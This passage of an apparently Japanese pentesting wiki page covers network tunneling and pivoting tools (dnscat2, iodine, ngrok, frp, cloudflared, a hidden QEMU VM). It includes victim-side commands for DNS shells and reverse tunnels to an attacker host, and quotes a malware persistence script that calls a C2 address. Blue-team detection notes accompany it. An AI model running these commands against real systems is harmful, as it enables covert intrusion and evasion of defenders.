前述のツール**Rpivot**は、NTLM認証を行うプロキシ経由でリレーできます。**OpenVPN**も、authファイルとNTLMv2方式を設定すれば、そのプロキシ経由でルーティングできます。これはプロキシ認証のバイパスではなく、プロキシの通過です。<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlmは上流のNTLMプロキシに対して認証し、ローカルリスナーを公開して、ローカルのトンネルポートを宛先サービスにマッピングできます。クライアントはそのローカルポートを使用できます。<sup>[[29]](#references)</sup>\
たとえば、ポート443を転送します。

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Now、たとえば被害者側で **SSH** サービスがポート443で待ち受けるように設定すると、攻撃者側のポート2222を通じて接続できます。<sup>[[29]](#references)</sup>\
攻撃者側でポート2222を待ち受けながら、localhost:443に接続する **meterpreter** を使うこともできます。<sup>[[29]](#references)</sup>

## YARP

YARP（Yet Another Reverse Proxy）は、Microsoftの.NET向けリバースプロキシツールキットです。こちらから入手できます: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)。<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

IodineはDNSクエリを通じてIPv4トンネルを作成し、TUNインターフェースを使用します。ドキュメントに記載されたセットアップでは、両端でそれらのインターフェースを作成するために必要な権限が求められます。<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

DNSトランスポートは直接のTCP接続よりオーバーヘッドが大きく、通常は遅いため、このトンネル経由で圧縮SSH接続を作成できます:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**ここからダウンロード**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 は DNS 経由で暗号化された command-and-control チャネルを確立します。以下のサーバーおよびクライアントのコマンドは、ドキュメントに記載された使い方に従っています。<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **PowerShellで**

[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)を使うと、PowerShellでdnscat2 clientを実行できます。READMEには、以下に示す`Start-Dnscat2`のパラメーターが記載されています。<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **dnscatでのPort forwarding**

dnscat2の対話型`listen`コマンドは、ローカルリスナーをリモートホストとポートにマッピングします。<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Change proxychains DNS

Proxychains-ng は動的リンクされた TCP 接続をフックしますが、UDP や ICMP は転送できません。DNS プロキシは設定可能なので、固定の公開リゾルバーを想定せず、インストール済みの `proxychains.conf` とリゾルバーヘルパーを確認してください。レガシーな `proxyresolv` スクリプトでは、リゾルバーの選択に `PROXY_DNS_SERVER` を使用します。内部名が必要な場合は、ピボットから到達可能なリゾルバーを使ってください。<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 アクターは、企業ネットワークでブロックされることがまれな 2 つのプロトコル、送信 DNS と平文の HTTP POST トラフィックのみを悪用する**デュアルチャネル C2（「AK47C2」）**を作成しました。<sup>[[2]](#references)</sup>

1. **DNS モード（AK47DNS）**
   • ランダムな 5 文字の SessionID（例: `H4T14`）を生成します。  
   • *タスクリクエスト*には `1` を、*結果*には `2` を先頭に付け、異なるフィールド（フラグ、SessionID、コンピューター名）を連結します。  
   • 各フィールドは ASCII キー `VHBD@H` で **XOR 暗号化**され、16 進数にエンコードされた後、ドットで連結されます。最後に攻撃者が制御するドメインが続きます。

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • リクエストでは、**TXT**（およびフォールバックとして**MG**）レコードに `DnsQuery()` を使用します。  
   • 応答が0xFFバイトを超えると、backdoorはデータを63バイト単位に分割し、C2サーバーが順序を並べ替えられるよう、次のマーカーを挿入します。
     `s<SessionID>t<TOTAL>p<POS>`

2. **HTTP mode (AK47HTTP)**
   • JSONエンベロープを構築します。
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • blob全体をXOR-`VHBD@H`で処理してからhexに変換し、`Content-Type: text/plain`ヘッダーを付けた**`POST /`**のbodyとして送信します。
   • 返信も同じエンコード方式に従い、`cmd`フィールドは`cmd.exe /c <command> 2>&1`で実行されます。

Blue Team notes
• 最初のラベルが長いhexで、常に同じ珍しいドメインで終わる、通常と異なる**TXT queries**を探します。
• 固定のXORキーの後にASCII-hexが続くパターンは、YARAで容易に検出できます: `6?56484244?484`（`VHBD@H`のhex表現）。
• HTTPでは、本文が純粋なhexで、バイト数が2の倍数であるtext/plainのPOSTにフラグを立てます。

{{#note}}
このchannelでは各サブドメインラベルをDNSの63オクテット制限内に収めていますが、プロトコルに準拠しているだけではステルス性は確保できません。珍しいドメイン、長いhexラベル、クエリ量は引き続き検出シグナルとなります。<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hansは、TUNデバイスとICMP echo requestを使ったIPv4-over-ICMPトンネルについて説明しています。このセットアップには、インターフェースを作成できる十分な権限が必要です。<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Download it from here**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng は TCP 接続を ICMP 経由で転送します。以下に示す `-p`、`-l`、`-r`、`-R` オプションは、それぞれ proxy、local listener、宛先ホスト、宛先ポートに使用します。<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) は、安全なトンネルを介してローカルネットワークのサービスをオンラインに公開するエージェントです。CLI では HTTP、TCP、ファイル URL のエンドポイントが説明されており、表示されるエンドポイントのホスト名はエンドポイントやアカウントによって異なる場合があります。<sup>[[39]](#references)</sup>

### インストール

- アカウントを作成: https://ngrok.com/signup
- クライアントのダウンロード:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### 基本的な使い方

**ドキュメント:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_必要に応じて、agent は認証や TLS のオプションにも対応しています。<sup>[[39]](#references)</sup>_

#### Tunneling TCP

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### HTTPでファイルを公開する

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### HTTP呼び出しのスニッフィング

_XSS、SSRF、SSTIなどに有用_\
スタンドアロンエージェントは、デフォルトで `http://127.0.0.1:4040` にHTTP検査インターフェースを公開します。このインターフェースはHTTPトラフィック用です。<sup>[[40]](#references)</sup>

#### 内部HTTPサービスのトンネリング

`--host-header=rewrite` オプションは、上流HTTPの `Host` ヘッダーをローカルサービスに一致するよう書き換えます。<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### ngrok.yaml のシンプルな設定例

これは ngrok Agent Config v2 を使用します。名前付きトンネルでは proto と addr を指定し、ngrok start で起動します。<sup>[[42]](#references)</sup> 3つのトンネルを開きます。

- TCP が2つ
- /tmp/httpbin/ から静的ファイルを公開する HTTP が1つ

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels は、Microsoft のリレーインフラストラクチャを介して、ローカルの TCP ベースのサービスを公開できます。ホスト側の CLI がアウトバウンドトンネルを作成し、クライアント側で `devtunnel connect` を実行すると、ホストされたポートが再現されます。アクセス制御を意図的に緩和しない限り、トンネルにはデフォルトで認証が必要です。<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

これは、境界で新たなインバウンドリスナーを開かずに、`*.devtunnels.ms` 経由で RDP を公開できます。また、`rdp2tcp` などの RDP virtual-channel tunnel と組み合わせることで、RDP セッションを任意の TCP トラフィック用の第 2 段階のピボットにできます。<sup>[[58]](#references)</sup>

ハンティングでは、Dev Tunnels CLI の実行を、`*.devtunnels.ms` への DNS/TLS トラフィックや、予期しない RDP virtual-channel イベントと関連付けます。認証済みトンネルは、Microsoft 所有のリレーを使っているからといって、無害とは限りません。<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel の `cloudflared` コネクターはアウトバウンド接続を確立します。公開アプリケーションでは HTTP、HTTPS、TCP、SSH、RDP をルーティングできますが、quick tunnel は HTTP 開発向けです。<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel のワンライナー

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### SOCKS5 origin（legacy mode）

legacy の `--socks5` フラグは、ローカル origin が SOCKS5 を使用することを `cloudflared` に伝えます。ローカル SOCKS5 listener を作成するものではありません。managed tunnel では、`originRequest.proxyType: socks` によって SOCKS5 origin の処理を設定します。<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### DNSを使用した永続tunnel

ローカルで管理するtunnel設定では、以下に示すように、小文字の `tunnel`、`credentials-file`、`url` キーを使用します。<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

コネクタを起動します:

```bash
cloudflared tunnel run mytunnel
```

The connector は outbound 接続を確立し、デフォルトでは QUIC をネゴシエートして、失敗した場合は HTTP/2 にフォールバックします。すべての deployment が TCP/443 を使用すると想定しないでください。deployment に必要な権限だけを付与して実行してください。<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) は、**TCP、UDP、HTTP/S、STCP/SUDP、TCPMUX、XTCP** に対応する Go 製 reverse proxy です。XTCP は P2P hole punching を使用し、その成功は NAT に左右されます。**v0.53.0** 以降は **SSH Tunnel Gateway** として動作できるため、ターゲットホストは `frpc` バイナリを使わずに標準の OpenSSH client を使用できます。<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### 従来の reverse TCP tunnel

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### 新しいSSHゲートウェイを使う（frpcバイナリなし）

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

上記のコマンドは、標準のOpenSSHクライアントを使い、`frps`をゲートウェイとして、被害者側のポート**8080**を**attacker_ip:9000**として公開します。<sup>[[50]](#references)</sup>

## STUNを利用したUDPバックコネクト

UDPソケットから送信したSTUN Bindingリクエストにより、そのソケットのサーバーリフレクティブIPアドレスとポートを特定でき、定期的に通信することでNATのバインディングを維持できます。公開STUNサーバーは、任意の制御パケットを中継するものではありません。<sup>[[60]](#references)</sup> 分析されたバックコネクトの設計では、短い制御データグラムに同じUDPソケットを使い、トリガーを受信した後、*別のアウトバウンドTCP接続*を使ってコマンドを取得・実行していました。<sup>[[59]](#references)</sup>

コントローラーからUDPパケットを受信するには、設計上、コントローラーとマッピングを共有し、NATのフィルタリングポリシーを満たす必要があります。アドレス依存またはポート依存のフィルタリングでは、STUNサーバーからの応答は受け入れても、別のエンドポイントからのパケットは破棄される場合があります。<sup>[[60]](#references)[[61]](#references)</sup> 分析対象のバックドアではランデブー経路が検証されていないため、STUN応答が成功しただけでは制御チャネルに到達できるとは証明できません。<sup>[[59]](#references)</sup> ランデブーとリレーへのフォールバックを明示的に備えた別のプロトコルについては、[PPPP camera NAT traversal](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport)を参照してください。

## QEMUを使ったステルス性の高いVMベースのトンネル

QEMUのユーザーモードネットワークでは、仮想ネットワークにroot権限や管理者権限は不要で、`-netdev user,hostfwd=...`を使うと、ホストからゲストへTCP、UDP、またはUNIX接続を転送できます。<sup>[[51]](#references)</sup> TrustedSecは、ホストに重点を置いたEDRがゲスト内のアクティビティを見逃す可能性があるインシデントで、Tiny Core QEMU VMと、試みられたリバースSSHトンネルについて記録しています。<sup>[[1]](#references)</sup>

### 手早く使えるワンライナー

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• 上記のコマンドは、ゲストメモリ256 MiB、qcow2ディスクイメージを使用する**Tiny Core Linux**ゲストを起動します。ディスクイメージはRAMディスクではありません。
• Windowsホストのポート**2222/tcp**は、ゲスト内の**22/tcp**に透過的に転送されます。
• 攻撃者から見ると、ターゲットが公開しているのはポート2222だけです。このポートに到達したパケットは、VM内で動作するSSHサーバーによって処理されます。

### VBScriptを使ったステルス起動

TrustedSecは、上記のインシデントで、VBSによるQEMUの起動とTiny Coreイメージを確認しました。<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

`cscript.exe //B update.vbs`でスクリプトを実行すると、ウィンドウは非表示のままです。<sup>[[1]](#references)</sup>

### ゲスト内での永続化

引用されたインシデントでは、ステートレスなTiny Coreゲストで`/opt/bootlocal.sh`と`/opt/filetool.lst`を使って永続化しています。<sup>[[1]](#references)</sup>

1. ペイロードを`/opt/123.out`に配置する  
2. `/opt/bootlocal.sh`に追記する：

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. `home/tc` と `opt` を `/opt/filetool.lst` に追加し、シャットダウン時に payload が `mydata.tgz` にパックされるようにします。

### Telemetry に関する考慮事項

• ホスト上では引き続き、QEMU プロセス、qcow2 イメージ、ホスト転送されたリスナーが確認できます。  
• ホストのみを対象とするプロセススキャンでは guest のプロセスを調べない場合がありますが、仮想化によって確実に検出を回避できるわけではありません。ネットワーク、QEMU、イメージの telemetry から検出される可能性があります。<sup>[[1]](#references)[[51]](#references)</sup>

### Defender 向けのヒント

• ユーザーが書き込み可能なパスにある**予期しない QEMU/VirtualBox/KVM バイナリ**を検知します。  
• `qemu-system*.exe` を起点とする外向き接続をブロックします。  
• QEMU の起動直後にバインドする、まれな待ち受けポート（2222、10022、…）を調査します。

## `HttpAddUrl` を介した IIS/HTTP.sys relay ノード (ShadowPad)

Check Point は、ShadowPad の IIS module が `HttpAddUrl` を介して URL prefix をバインドし、侵害された境界 web server を backdoor および relay ノードに変える仕組みについて説明しています。<sup>[[3]](#references)</sup>

同レポートでは、以下にまとめたデフォルト設定、wildcard listener、packet decryption、relay queue、debug telemetry についても詳しく説明しています。<sup>[[3]](#references)</sup>

* **Config のデフォルト** – module の JSON config で値が省略されている場合、IIS のもっともらしいデフォルト値（`Server: Microsoft-IIS/10.0`、`DocumentRoot: C:\inetpub\wwwroot`、`ErrorPage: C:\inetpub\custerr\en-US\404.htm`）にフォールバックします。これにより、通常の traffic には IIS が正しいブランド表示で応答します。
* **Wildcard による傍受** – operator は URL prefix（host と path に wildcard を含む）のセミコロン区切りリストを指定します。module は各項目に対して `HttpAddUrl` を呼び出し、HTTP.sys は一致する request を悪意ある handler にルーティングします。一致しない request は通常の IIS の動作にフォールバックします。
* **暗号化された最初の packet** – request body の最初の 2 byte が独自の 32-bit PRNG の seed になります。protocol parsing の前に、それ以降の各 byte は生成された keystream と XOR されます。

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Relay orchestration** – このモジュールは「servers」（上流ノード）と「clients」（下流インプラント）の2つのリストを管理します。約30秒以内にheartbeatが届かないエントリは削除されます。両方のリストが空でない場合、最初の正常なserverと最初の正常なclientをペアにし、片側のソケットが閉じるまで両者の間でバイト列をそのまま転送します。
* **Debug telemetry** – オプションのログには、各ペアの送信元IP、宛先IP、転送された総バイト数が記録されます。調査担当者は、こうした痕跡を使って複数の被害者にまたがるShadowPadのmeshを再構築しました。

---

## 確認すべきその他のツール

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [影に潜む：QEMU仮想化を介した covert tunnel](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – ToolShell以前：Storm-2603の過去のransomware活動を探る](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Ink Dragonの内部：ステルス性の高い攻撃作戦のrelay networkと内部の仕組みを明らかにする](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Reference Guide：Firewall/IDSの制限を回避する](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh manual](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config manual](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 release notes](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit：MetasploitでのPivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxy module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autoroute module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike：SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike：Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng クイックスタート](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat manual](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink manual](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY command-line options](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier documentation](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 manual](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035：ドメイン名 - 実装と仕様](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnelの概要](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnel origin parameters](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnelのセットアップ](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel configuration file](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnel run parameters](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frpの概念](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU networking documentation](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [NetSPI BOFScale source repository](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale：BOF-PEからのCDNフロント型Tailnet](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn - Dev Tunnels CLIコマンド](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [NightEagle APT：GhostContainerとTunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
- [59] [FortiGuard Labs - ClingSTUN Linux Backdoorが公開STUNインフラを悪用](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
- [60] [RFC 8489 - NAT traversal utilities for sessions (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
- [61] [RFC 4787 - Unicast UDPのNAT動作要件](https://www.rfc-editor.org/rfc/rfc4787.html)
- [62] [Tailcat README](https://github.com/tailscale/tailcat/blob/main/README.md)
- [63] [Malwarebytes - Kothamine malwareがTailscaleのtailcatを使ってnetwork detectionを回避](https://www.malwarebytes.com/blog/threat-intel/2026/09/kothamine-malware-uses-tailscales-tailcat-to-evade-network-detection)
{{#include ../banners/hacktricks-training.md}}
